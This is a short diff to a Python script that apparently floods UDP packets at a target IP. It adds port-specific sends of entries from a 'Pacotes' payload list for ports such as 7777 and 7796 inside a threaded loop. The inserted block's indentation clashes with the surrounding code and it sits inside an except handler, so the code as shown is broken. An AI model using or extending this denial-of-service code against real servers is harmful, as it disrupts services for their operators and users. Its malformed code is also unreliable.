@@ -54,6 +54,15 @@ def run2():
     except:
       s.close()
       print("[*] Error")
+      
+      if(int(port) == 7777):
+                    sock.sendto(Pacotes[5], (ip, int(port)))
+                elif(int(port) == 7796):
+                    sock.sendto(Pacotes[4], (ip, int(port)))
+                elif(int(port) == 7771):
+                    sock.sendto(Pacotes[6], (ip, int(port)))
+                elif(int(port) == 7784):
+                    sock.sendto(Pacotes[7], (ip, int(port)))
 
 for y in range(threads):
   if choice == 'y':
